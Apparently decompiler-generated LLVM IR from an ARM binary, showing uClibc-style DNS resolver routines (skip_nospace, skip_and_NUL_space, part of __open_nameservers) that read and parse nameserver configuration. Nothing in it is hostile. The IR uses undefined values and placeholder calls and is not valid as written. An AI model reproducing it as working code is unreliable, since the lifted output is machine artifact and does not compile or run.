  uselistorder i32 %v3_18a58, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_18a44, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 2, 26, 27, 1, 54, 28, 29, 30, 31, 32, 33, 34, 40, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 33, 29, 30, 31, 32, 34, 35, 36, 9, 10, 11, 12, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 10, 11, 12, 13, 14, 15, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 30, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 29, 3, 31, 32, 33, 34, 35, 2, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32)* @__GI_close, { 12, 11, 13, 18, 17, 16, 15, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 0, 4, 3, 2, 1 }
  uselistorder i32 64, { 2, 16, 0, 13, 9, 11, 4, 5, 6, 7, 1, 3, 14, 15, 10, 8, 12, 17 }
  uselistorder i32 1000, { 5, 3, 6, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 0, 7, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 17, { 1, 7, 0, 9, 8, 2, 3, 5, 4, 6 }
  uselistorder i32 76, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 2, 13, 14, 18, 19, 20, 21, 15, 16, 17, 3 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 27616, { 2, 0, 1, 3 }
  uselistorder i32 512, { 3, 9, 2, 10, 1, 5, 6, 7, 8, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_191cc, { 1, 0 }
  uselistorder label %dec_label_pc_191b4, { 1, 0 }
  uselistorder label %dec_label_pc_19194, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1918c, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_19174, { 1, 0 }
  uselistorder label %dec_label_pc_19164, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1913c, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_19114, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1906c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18ff8, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_18f0c, { 1, 0 }
  uselistorder label %dec_label_pc_18eb8, { 1, 0 }
  uselistorder label %dec_label_pc_18e88, { 1, 0 }
  uselistorder label %dec_label_pc_18e60, { 1, 0 }
  uselistorder label %dec_label_pc_18dac, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_18c08, { 1, 0 }
  uselistorder label %dec_label_pc_18bcc, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_191dc:
  %v0_191dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_191dc, label %.thread5, label %.thread13

.thread5:                                         ; preds = %dec_label_pc_191dc
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %dec_label_pc_191dc
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 1824, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19270 = load i32, i32* @r4, align 4
  store i32 %v3_19270, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @ip, align 4
  store i32 1824, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_19280.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_192809 = inttoptr i32 %v0_19280.pre to i8*
  %v2_1928010 = load i8, i8* %v1_192809, align 1
  %v2_1928412 = icmp eq i8 %v2_1928010, 0
  store i1 %v2_1928412, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1928412, label %dec_label_pc_192b4, label %dec_label_pc_19290

dec_label_pc_19290:                               ; preds = %entry, %bb8.dec_label_pc_19290_crit_edge
  %v1_19290 = phi i32 [ %v1_19290.pre, %bb8.dec_label_pc_19290_crit_edge ], [ 1824, %entry ]
  %v0_19290 = phi i32 [ %v0_19290.pre, %bb8.dec_label_pc_19290_crit_edge ], [ ptrtoint (i32* @global_var_26934.581 to i32), %entry ]
  %v2_1928016 = phi i8 [ %v2_19280, %bb8.dec_label_pc_19290_crit_edge ], [ %v2_1928010, %entry ]
  %v2_1928817.in.in = phi i8 [ %v2_19280, %bb8.dec_label_pc_19290_crit_edge ], [ %v2_1928010, %entry ]
  %v1_1928015 = phi i8* [ %v1_19280, %bb8.dec_label_pc_19290_crit_edge ], [ %v1_192809, %entry ]
  %v2_192a814 = phi i32 [ %v2_192ac, %bb8.dec_label_pc_19290_crit_edge ], [ %v0_19280.pre, %entry ]
  %v2_1928817.in = zext i8 %v2_1928817.in.in to i32
  %v2_1928817 = mul nuw nsw i32 %v2_1928817.in, 2
  %v2_19290 = add i32 %v1_19290, %v0_19290
  %v3_19290 = inttoptr i32 %v2_19290 to i32*
  %v4_19290 = load i32, i32* %v3_19290, align 4
  %v2_19294 = add i32 %v4_19290, %v2_1928817
  %v3_19294 = inttoptr i32 %v2_19294 to i16*
  %v4_19294 = load i16, i16* %v3_19294, align 2
  %v1_19298 = and i16 %v4_19294, 32
  %v2_19298 = icmp eq i16 %v1_19298, 0
  store i1 %v2_19298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19298, label %dec_label_pc_192b4, label %dec_label_pc_192a0

dec_label_pc_192a0:                               ; preds = %dec_label_pc_19290
  %v7_192a0 = icmp eq i8 %v2_1928016, 35
  br i1 %v7_192a0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_192a0
  %v8_192a4 = icmp eq i8 %v2_1928016, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_192a0, %bb
  %storemerge = phi i1 [ %v8_192a4, %bb ], [ %v7_192a0, %dec_label_pc_192a0 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_192a8 = load i32, i32* %lr.global-to-local, align 4
  %v1_192a8 = trunc i32 %v0_192a8 to i8
  store i8 %v1_192a8, i8* %v1_1928015, align 1
  %v0_192ac = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_192b8.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_192ac, label %dec_label_pc_192b4, label %bb8

bb8:                                              ; preds = %bb7
  %v2_192ac = add i32 %v1_192b8.pre, 1
  store i32 %v2_192ac, i32* %r0.global-to-local, align 4
  %v1_19280 = inttoptr i32 %v2_192ac to i8*
  %v2_19280 = load i8, i8* %v1_19280, align 1
  %v2_19284 = icmp eq i8 %v2_19280, 0
  store i1 %v2_19284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19284, label %dec_label_pc_192b4, label %bb8.dec_label_pc_19290_crit_edge

bb8.dec_label_pc_19290_crit_edge:                 ; preds = %bb8
  %v0_19290.pre = load i32, i32* @ip, align 4
  %v1_19290.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19290

dec_label_pc_192b4:                               ; preds = %bb8, %dec_label_pc_19290, %bb7, %entry
  %v1_192b8 = phi i32 [ %v0_19280.pre, %entry ], [ %v1_192b8.pre, %bb7 ], [ %v2_192a814, %dec_label_pc_19290 ], [ %v2_192ac, %bb8 ]
  %v2_192b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_192b4, i32* @r4, align 4
  ret i32 %v1_192b8

; uselistorder directives
  uselistorder i8 %v2_19280, { 2, 1, 0 }
  uselistorder i8* %v1_19280, { 1, 0 }
  uselistorder i32 %v2_192ac, { 0, 2, 3, 1 }
  uselistorder i1 %v2_19298, { 1, 0 }
  uselistorder i8 %v2_1928016, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 1824, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_192b4, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_19290, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_192c4 = load i32, i32* @r4, align 4
  store i32 %v3_192c4, i32* %stack_var_-36, align 4
  %v15_192c4 = load i32, i32* @r8, align 4
  %v18_192c4 = load i32, i32* @sb, align 4
  %v21_192c4 = load i32, i32* @sl, align 4
  %v24_192c4 = load i32, i32* @fp, align 4
  %v27_192c4 = load i32, i32* @lr, align 4
  store i32 28648, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  %v4_192d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 28648) to i32*), align 4
  store i32 %v4_192d4, i32* @r4, align 4
  %v2_192d8 = icmp eq i32 %v4_192d4, 0
  br i1 %v2_192d8, label %dec_label_pc_192e4, label %dec_label_pc_19314

dec_label_pc_192e4:                               ; preds = %entry
  %v2_192e8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_192e8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32932), i32* %r0.global-to-local, align 4
  %v2_192f0 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32932), i32 %v2_192e8)
  store i32 %v2_192f0, i32* %r0.global-to-local, align 4
  %v2_192f4 = icmp eq i32 %v2_192f0, 0
  %v1_192f8 = load i32, i32* @r4, align 4
  %.v1_192f8 = select i1 %v2_192f4, i32 %tmp38, i32 %v1_192f8
  store i32 27644, i32* %r1.global-to-local, align 4
  store i32 %.v1_192f8, i32* %r2.global-to-local, align 4
  %v0_19304 = load i32, i32* @r5, align 4
  %v2_19304 = add i32 %v0_19304, 27644
  %v3_19304 = inttoptr i32 %v2_19304 to i32*
  %v4_19304 = load i32, i32* %v3_19304, align 4
  store i32 %v4_19304, i32* %r3.global-to-local, align 4
  %v9_19308 = icmp eq i32 %v4_19304, %.v1_192f8
  br i1 %v9_19308, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_192e4
  store i32 %.v1_192f8, i32* %v3_19304, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_192e4, %bb
  store i32 103188, i32* @lr, align 4
  %v1_19310 = xor i1 %v9_19308, true
  call void @__pseudo_cond_branch(i1 %v1_19310, i32 ptrtoint (i32* @global_var_19720.954 to i32))
  %v0_19318.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19314

dec_label_pc_19314:                               ; preds = %entry, %bb58
  %v2_1932c = phi i32 [ ptrtoint (i32* @global_var_26934.581 to i32), %entry ], [ %v0_19318.pre, %bb58 ]
  store i32 28660, i32* %r3.global-to-local, align 4
  %v2_19318 = add i32 %v2_1932c, 28660
  %v3_19318 = inttoptr i32 %v2_19318 to i32*
  %v4_19318 = load i32, i32* %v3_19318, align 4
  store i32 %v4_19318, i32* %r3.global-to-local, align 4
  %v2_1931c = icmp eq i32 %v4_19318, 0
  br i1 %v2_1931c, label %dec_label_pc_19324, label %dec_label_pc_196b8

dec_label_pc_19324:                               ; preds = %dec_label_pc_19314
  %v4_1932c = add i32 %v2_1932c, 2422
  %v5_1932c = inttoptr i32 %v4_1932c to i8*
  store i8 5, i8* %v5_1932c, align 1
  store i32 -32932, i32* %r0.global-to-local, align 4
  store i32 2423, i32* %r3.global-to-local, align 4
  store i32 -33888, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_19340 = load i32, i32* @r5, align 4
  %v4_19340 = add i32 %v2_19340, 2423
  %v5_19340 = inttoptr i32 %v4_19340 to i8*
  store i8 3, i8* %v5_19340, align 1
  %v0_19344 = load i32, i32* @r5, align 4
  %v1_19344 = load i32, i32* %r0.global-to-local, align 4
  %v2_19344 = add i32 %v1_19344, %v0_19344
  store i32 %v2_19344, i32* @r0, align 4
  %v1_19348 = load i32, i32* %r1.global-to-local, align 4
  %v2_19348 = add i32 %v1_19348, %v0_19344
  store i32 %v2_19348, i32* @r1, align 4
  %v2_1934c = call i32 @__GI_fopen(i32 %v2_19344, i32 %v2_19348)
  store i32 %v2_1934c, i32* %r0.global-to-local, align 4
  store i32 %v2_1934c, i32* @fp, align 4
  %v2_19350 = icmp eq i32 %v2_1934c, 0
  br i1 %v2_19350, label %dec_label_pc_195dc, label %dec_label_pc_19584

dec_label_pc_1935c:                               ; preds = %dec_label_pc_19584, %dec_label_pc_195b8.backedge
  store i32 %v2_195b8, i32* %r0.global-to-local, align 4
  %v2_19360 = call i32 @skip_and_NUL_space(i8* %v1_19360)
  store i32 %v2_19360, i32* %r0.global-to-local, align 4
  store i32 %v2_19360, i32* @r4, align 4
  %v0_19368 = call i32 @skip_nospace()
  store i32 %v0_19368, i32* %r0.global-to-local, align 4
  %v1_1936c = inttoptr i32 %v0_19368 to i8*
  %v2_1936c = call i32 @skip_and_NUL_space(i8* %v1_1936c)
  store i32 %v2_19588, i32* @r1, align 4
  store i32 %v2_1936c, i32* @r7, align 4
  %v0_19378 = load i32, i32* @r4, align 4
  store i32 %v0_19378, i32* %r0.global-to-local, align 4
  %v2_1937c = inttoptr i32 %v0_19378 to i8*
  %v3_1937c = call i32 @__GI_strcoll(i8* %v2_1937c, i32 %v2_19588)
  store i32 %v3_1937c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1937c, 16777216
  %v1_19380 = sdiv i32 %sext, 16777216
  store i32 %v1_19380, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_19388, label %dec_label_pc_19444

dec_label_pc_19388:                               ; preds = %dec_label_pc_1935c
  %v0_19388 = load i32, i32* @r7, align 4
  store i32 %v0_19388, i32* %r0.global-to-local, align 4
  %v0_1938c = call i32 @skip_nospace()
  %v1_1938c = inttoptr i32 %v0_1938c to i8*
  store i32 %v2_19390, i32* @r4, align 4
  %v0_19394 = load i32, i32* @r6, align 4
  %v1_19394 = trunc i32 %v0_19394 to i8
  store i8 %v1_19394, i8* %v1_1938c, align 1
  %v0_19398 = load i32, i32* @r6, align 4
  store i32 %v0_19398, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_19390, i32* %r0.global-to-local, align 4
  %v3_193a4 = call i32 @__GI_memset(i8* %v2_193a4, i32 %v0_19398)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_193ac = load i32, i32* @r7, align 4
  store i32 %v0_193ac, i32* %r1.global-to-local, align 4
  store i32 %v2_193b0, i32* %r2.global-to-local, align 4
  %v3_193b4 = inttoptr i32 %v0_193ac to i8*
  %v4_193b4 = call i32 @inet_pton(i32 10, i8* %v3_193b4, i32 %v2_193b0)
  store i32 %v4_193b4, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_193b4, 1
  br i1 %tmp59, label %dec_label_pc_193c4, label %dec_label_pc_193e0

dec_label_pc_193c4:                               ; preds = %dec_label_pc_19388
  %v0_193c4 = load i32, i32* @r7, align 4
  store i32 %v0_193c4, i32* %r1.global-to-local, align 4
  store i32 %v2_193c8, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_193d0 = inttoptr i32 %v0_193c4 to i8*
  %v4_193d0 = call i32 @inet_pton(i32 2, i8* %v3_193d0, i32 %v2_193c8)
  store i32 %v4_193d0, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_193d0, 1
  br i1 %tmp60, label %dec_label_pc_195b8.backedge, label %dec_label_pc_193e0

dec_label_pc_193e0:                               ; preds = %dec_label_pc_193c4, %dec_label_pc_19388
  %v0_193e4 = phi i8* [ inttoptr (i32 10 to i8*), %dec_label_pc_19388 ], [ inttoptr (i32 2 to i8*), %dec_label_pc_193c4 ]
  store i32 %v2_193e0, i32* %r2.global-to-local, align 4
  store i8* %v0_193e4, i8** %stack_var_-68, align 4
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 28660, i32* @r7, align 4
  %v0_193f4 = load i32, i32* @r5, align 4
  %v2_193f4 = add i32 %v0_193f4, 28660
  %v3_193f4 = inttoptr i32 %v2_193f4 to i32*
  %v4_193f4 = load i32, i32* %v3_193f4, align 4
  store i32 28656, i32* @sl, align 4
  %v1_193fc = add i32 %v4_193f4, 1
  store i32 %v1_193fc, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_19404 = mul i32 %v1_193fc, 28
  store i32 %v2_19404, i32* %r1.global-to-local, align 4
  %v2_19408 = add i32 %v0_193f4, 28656
  %v3_19408 = inttoptr i32 %v2_19408 to i32*
  %v4_19408 = load i32, i32* %v3_19408, align 4
  store i32 %v4_19408, i32* %r0.global-to-local, align 4
  %v2_1940c = inttoptr i32 %v4_19408 to i32*
  %v3_1940c = call i32 @realloc(i32* %v2_1940c, i32 %v2_19404)
  store i32 %v3_1940c, i32* %r0.global-to-local, align 4
  store i32 %v3_1940c, i32* @r6, align 4
  %v2_19410 = icmp eq i32 %v3_1940c, 0
  br i1 %v2_19410, label %dec_label_pc_195b8.backedge, label %dec_label_pc_19418

dec_label_pc_19418:                               ; preds = %dec_label_pc_193e0
  %v0_19418 = load i32, i32* @r5, align 4
  %v1_19418 = load i32, i32* @r7, align 4
  %v2_19418 = add i32 %v1_19418, %v0_19418
  %v3_19418 = inttoptr i32 %v2_19418 to i32*
  %v4_19418 = load i32, i32* %v3_19418, align 4
  store i32 %v4_19418, i32* %r4.global-to-local, align 4
  %v1_1941c = load i32, i32* @r8, align 4
  %v3_1941c = mul i32 %v1_1941c, %v4_19418
  %v4_1941c = add i32 %v3_1941c, %v3_1940c
  store i32 %v4_1941c, i32* %lr.global-to-local, align 4
  %v2_19424 = load i8*, i8** %stack_var_-68, align 4
  %v3_19424 = ptrtoint i8* %v2_19424 to i32
  store i32 %v3_19424, i32* %r0.global-to-local, align 4
  %v6_19424 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_19424, i32* %r1.global-to-local, align 4
  %v9_19424 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_19424, i32* %r2.global-to-local, align 4
  store i32 %v14_19424, i32* @ip, align 4
  %v2_19428 = load i32, i32* @sl, align 4
  %v3_19428 = add i32 %v2_19428, %v0_19418
  %v4_19428 = inttoptr i32 %v3_19428 to i32*
  store i32 %v3_1940c, i32* %v4_19428, align 4
  %v0_1942c = load i32, i32* %lr.global-to-local, align 4
  %v1_1942c = inttoptr i32 %v0_1942c to i32*
  %v2_1942c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1942c, i32* %v1_1942c, align 4
  %v3_1942c = add i32 %v0_1942c, 4
  %v4_1942c = inttoptr i32 %v3_1942c to i32*
  %v5_1942c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1942c, i32* %v4_1942c, align 4
  %v6_1942c = add i32 %v0_1942c, 8
  %v7_1942c = inttoptr i32 %v6_1942c to i32*
  %v8_1942c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1942c, i32* %v7_1942c, align 4
  %v9_1942c = add i32 %v0_1942c, 12
  %v10_1942c = inttoptr i32 %v9_1942c to i32*
  %v11_1942c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1942c, i32* %v10_1942c, align 4
  %v12_1942c = add i32 %v0_1942c, 16
  store i32 %v12_1942c, i32* @lr, align 4
  %v2_19430 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_19430, i32* %r0.global-to-local, align 4
  %v0_19434 = load i32, i32* %r4.global-to-local, align 4
  %v1_19434 = add i32 %v0_19434, 1
  store i32 %v1_19434, i32* %r4.global-to-local, align 4
  %v1_19438 = inttoptr i32 %v12_1942c to i32*
  store i32 %v2_19430, i32* %v1_19438, align 4
  %v3_19438 = add i32 %v0_1942c, 20
  %v4_19438 = inttoptr i32 %v3_19438 to i32*
  %v5_19438 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_19438, i32* %v4_19438, align 4
  %v6_19438 = add i32 %v0_1942c, 24
  %v7_19438 = inttoptr i32 %v6_19438 to i32*
  %v8_19438 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_19438, i32* %v7_19438, align 4
  %v0_1943c = load i32, i32* %r4.global-to-local, align 4
  %v1_1943c = load i32, i32* @r5, align 4
  %v2_1943c = load i32, i32* @r7, align 4
  %v3_1943c = add i32 %v2_1943c, %v1_1943c
  %v4_1943c = inttoptr i32 %v3_1943c to i32*
  store i32 %v0_1943c, i32* %v4_1943c, align 4
  br label %dec_label_pc_195b8.backedge

dec_label_pc_195b8.backedge:                      ; preds = %dec_label_pc_194e0, %dec_label_pc_194d0, %dec_label_pc_1949c, %dec_label_pc_19418, %dec_label_pc_19570, %dec_label_pc_193c4, %dec_label_pc_193e0, %dec_label_pc_19518, %dec_label_pc_19520, %dec_label_pc_19504, %dec_label_pc_19554
  %v0_195c4.pre = load i32, i32* @fp, align 4
  store i32 %v2_195b8, i32* @r4, align 4
  store i32 %v2_195b8, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_195c4.pre, i32* %r2.global-to-local, align 4
  %v3_195c8 = call i32 @fgets(i32 %v2_195b8, i32 128, i32 %v0_195c4.pre)
  store i32 %v3_195c8, i32* %r0.global-to-local, align 4
  %v2_195cc = icmp eq i32 %v3_195c8, 0
  br i1 %v2_195cc, label %dec_label_pc_195d4, label %dec_label_pc_1935c

dec_label_pc_19444:                               ; preds = %dec_label_pc_1935c
  %v0_19444 = load i32, i32* @r4, align 4
  store i32 %v0_19444, i32* %r0.global-to-local, align 4
  store i32 %v2_19594, i32* @r1, align 4
  %v2_1944c = inttoptr i32 %v0_19444 to i8*
  %v3_1944c = call i32 @__GI_strcoll(i8* %v2_1944c, i32 %v2_19594)
  store i32 %v3_1944c, i32* %r0.global-to-local, align 4
  %v2_19450 = icmp eq i32 %v3_1944c, 0
  br i1 %v2_19450, label %dec_label_pc_19484, label %dec_label_pc_19458

dec_label_pc_19458:                               ; preds = %dec_label_pc_19444
  %v0_19458 = load i32, i32* @r4, align 4
  store i32 %v0_19458, i32* %r0.global-to-local, align 4
  store i32 %v2_195a0, i32* @r1, align 4
  %v2_19460 = inttoptr i32 %v0_19458 to i8*
  %v3_19460 = call i32 @__GI_strcoll(i8* %v2_19460, i32 %v2_195a0)
  store i32 %v3_19460, i32* %r0.global-to-local, align 4
  %v2_19464 = icmp eq i32 %v3_19460, 0
  br i1 %v2_19464, label %dec_label_pc_19484, label %dec_label_pc_19504

dec_label_pc_19470:                               ; preds = %dec_label_pc_19484, %dec_label_pc_19470.dec_label_pc_19470_crit_edge
  %v2_19474 = phi i32 [ %v1_19488, %dec_label_pc_19470.dec_label_pc_19470_crit_edge ], [ %v1_1948810, %dec_label_pc_19484 ]
  %v0_19474 = phi i32 [ %v1_19490, %dec_label_pc_19470.dec_label_pc_19470_crit_edge ], [ %v1_1949017, %dec_label_pc_19484 ]
  %v1_19470 = phi i32 [ %v1_19470.pre, %dec_label_pc_19470.dec_label_pc_19470_crit_edge ], [ 28652, %dec_label_pc_19484 ]
  %v1_19474 = phi i32 [ %v0_19488, %dec_label_pc_19470.dec_label_pc_19470_crit_edge ], [ %v0_194889, %dec_label_pc_19484 ]
  %v2_19470 = add i32 %v1_19474, %v1_19470
  %v3_19470 = inttoptr i32 %v2_19470 to i32*
  %v4_19470 = load i32, i32* %v3_19470, align 4
  store i32 %v4_19470, i32* %r3.global-to-local, align 4
  %v3_19474 = add i32 %v1_19474, %v2_19474
  %v4_19474 = inttoptr i32 %v3_19474 to i32*
  store i32 %v0_19474, i32* %v4_19474, align 4
  %v0_19478 = load i32, i32* %r3.global-to-local, align 4
  %v1_19478 = load i32, i32* %r2.global-to-local, align 4
  %v4_19478 = mul i32 %v1_19478, 4
  %v5_19478 = add i32 %v4_19478, %v0_19478
  %v6_19478 = inttoptr i32 %v5_19478 to i32*
  %v7_19478 = load i32, i32* %v6_19478, align 4
  store i32 %v7_19478, i32* @r0, align 4
  %v0_1947c = call i32 @free()
  store i32 %v0_1947c, i32* %r0.global-to-local, align 4
  %v0_19488 = load i32, i32* @r5, align 4
  %v1_19488 = load i32, i32* @sb, align 4
  %v2_19488 = add i32 %v1_19488, %v0_19488
  %v3_19488 = inttoptr i32 %v2_19488 to i32*
  %v4_19488 = load i32, i32* %v3_19488, align 4
  store i32 %v4_19488, i32* %r3.global-to-local, align 4
  %v2_1948c = icmp eq i32 %v4_19488, 0
  %v1_19490 = add i32 %v4_19488, -1
  store i32 %v1_19490, i32* %r2.global-to-local, align 4
  br i1 %v2_1948c, label %dec_label_pc_19498, label %dec_label_pc_19470.dec_label_pc_19470_crit_edge

dec_label_pc_19470.dec_label_pc_19470_crit_edge:  ; preds = %dec_label_pc_19470
  %v1_19470.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19470

dec_label_pc_19484:                               ; preds = %dec_label_pc_19458, %dec_label_pc_19444
  store i32 28652, i32* @r4, align 4
  %v0_194889 = load i32, i32* @r5, align 4
  %v1_1948810 = load i32, i32* @sb, align 4
  %v2_1948811 = add i32 %v1_1948810, %v0_194889
  %v3_1948812 = inttoptr i32 %v2_1948811 to i32*
  %v4_1948813 = load i32, i32* %v3_1948812, align 4
  store i32 %v4_1948813, i32* %r3.global-to-local, align 4
  %v2_1948c15 = icmp eq i32 %v4_1948813, 0
  %v1_1949017 = add i32 %v4_1948813, -1
  store i32 %v1_1949017, i32* %r2.global-to-local, align 4
  br i1 %v2_1948c15, label %dec_label_pc_19498, label %dec_label_pc_19470

dec_label_pc_19498:                               ; preds = %dec_label_pc_19470, %dec_label_pc_19484
  store i32 28652, i32* @r6, align 4
  br label %dec_label_pc_1949c

dec_label_pc_1949c:                               ; preds = %dec_label_pc_194e0, %dec_label_pc_19498
  %v0_1949c = load i32, i32* @r7, align 4
  store i32 %v0_1949c, i32* %r0.global-to-local, align 4
  %v0_194a0 = call i32 @skip_nospace()
  store i32 %v0_194a0, i32* %r0.global-to-local, align 4
  %v1_194a4 = inttoptr i32 %v0_194a0 to i8*
  %v2_194a4 = call i32 @skip_and_NUL_space(i8* %v1_194a4)
  store i32 %v2_194a4, i32* %r0.global-to-local, align 4
  %v0_194a8 = load i32, i32* @r5, align 4
  %v1_194a8 = load i32, i32* @sb, align 4
  %v2_194a8 = add i32 %v1_194a8, %v0_194a8
